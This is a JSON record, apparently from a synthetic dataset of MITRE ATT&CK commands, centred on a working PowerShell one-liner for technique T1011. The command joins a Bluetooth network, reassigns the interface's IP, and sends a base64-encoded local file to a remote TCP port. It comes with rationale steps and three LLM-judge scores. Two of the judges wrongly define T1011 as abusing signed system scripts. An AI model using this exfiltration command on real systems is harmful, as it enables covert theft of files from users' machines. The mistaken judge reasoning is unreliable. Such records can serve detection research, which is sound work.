{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $i=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$i\" static 10.226.38.2 255.255.255.252 | Out-Null; $buf=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Music\\song.mp3'); $b=[Convert]::ToBase64String($buf); $cli=New-Object Net.Sockets.TcpClient; $cli.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.226.38.2'),0)); $cli.Connect('10.226.38.1',54295); $ns=$cli.GetStream(); [byte[]]$head=[Text.Encoding]::UTF8.GetBytes('POST /d HTTP/1.0`r`nX: bt`r`n`r`n'); $ns.Write($head,0,$head.Length); $bts=[Text.Encoding]::UTF8.GetBytes($b); $ns.Write($bts,0,$bts.Length); $ns.Close(); $cli.Close()",
  "explanation": "Encodes binary data and transmits it as an HTTP-like POST over a custom TCP port bound to the Bluetooth PAN IP, leveraging the alternate Bluetooth medium (T1011).",
  "rationale_steps": [
    "Connect to a Bluetooth NAP to establish Bluetooth networking.",
    "Configure the Bluetooth interface with a static IP via netsh.",
    "Bind TCP client to the Bluetooth IP to constrain the egress path.",
    "Send base64 payload over a high, uncommon TCP port using HTTP-like framing."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-de7999c0",
  "source_prompt_hash": "f4a0ca3c",
  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper PowerShell syntax, correct use of semicolons as command separators, valid method calls, and proper variable assignments.",
        "semantic_score": 4,
        "semantic_justification": "The command aligns with T1011 by establishing a Bluetooth PAN connection and exfiltrating data over this alternate communication channel, though it uses direct PowerShell networking rather than abusing a trusted system script as the primary technique description suggests.",
        "combined_score": 4.5,
        "confidence": 0.9,
        "timestamp": "2025-10-02T04:48:30.831706Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed, using correct PowerShell syntax for variable assignment, external command execution, pipelining, .NET object creation, and method calls.",
        "semantic_score": 1,
        "semantic_justification": "The command demonstrates data exfiltration over Bluetooth but does not involve abusing trusted or signed system scripts to proxy execution, which is the core mechanism of MITRE ATT&CK T1011.",
        "combined_score": 3.0,
        "confidence": 1,
        "timestamp": "2025-10-02T04:48:40.151870Z"
      },
      {
        "model": "gpt-5",
        "syntactic_score": 4,
        "syntactic_justification": "The PowerShell one-liner is parseable with balanced constructs and valid operators, but uses backtick CRLF escapes inside single quotes so they won\u2019t expand as intended.",
        "semantic_score": 4,
        "semantic_justification": "It plausibly exfiltrates data over a Bluetooth PAN by binding a TCP client to a Bluetooth-assigned IP and sending base64 content, aligning with T1011, though it likely needs admin rights for netsh and the literal CRLFs reduce operational reliability.",
        "combined_score": 4.0,
        "confidence": 0.7,
        "timestamp": "2025-10-02T04:49:24.194384Z"
      }
    ],
    "llm_average_syntactic": 4.667,
    "llm_average_semantic": 3.0,
    "llm_average_score": 3.833,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}